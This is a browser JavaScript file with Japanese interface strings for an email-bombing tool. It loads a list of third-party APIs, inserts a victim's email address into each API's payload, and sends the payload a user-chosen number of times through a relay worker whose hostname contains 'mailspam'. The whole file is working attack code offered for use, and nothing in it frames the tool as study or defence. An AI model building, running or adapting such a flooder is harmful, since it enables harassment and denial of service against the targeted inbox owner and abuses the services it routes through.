let apiList = {};

document.addEventListener("DOMContentLoaded", async () => {
  const apiSelect = document.getElementById("apiSelect");
  const log = document.getElementById("log");

  try {
    const res = await fetch("api-list.json");
    apiList = await res.json();

    apiSelect.innerHTML = "";
    for (const name in apiList) {
      const opt = document.createElement("option");
      opt.value = name;
      opt.textContent = name;
      apiSelect.appendChild(opt);
    }
  } catch {
    log.textContent = "APIリストの読み込み失敗したよ。";
  }

  document.getElementById("startBtn").addEventListener("click", async () => {
    const email = document.getElementById("email").value.trim();
    const count = parseInt(document.getElementById("count").value);
    const selected = apiList[apiSelect.value];

    if (!email || isNaN(count) || !selected) {
      log.textContent = "入力確認して。";
      return;
    }

    const raw = JSON.stringify(selected.payload);
    const payload = JSON.parse(raw.replace(/%EMAIL%/g, email));

    log.textContent = `送信中...\n`;
    const results = [];

    for (let i = 0; i < count; i++) {
      const status = await fetch("https://mailspam.nnnnnnnnnnnnnnnn.workers.dev/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target: selected.url,
          payload
        })
      }).then(r => r.status).catch(() => "ERR");

      results.push(`[#${i + 1}] → ${status}`);
    }

    log.textContent = results.join("\n");
  });
});
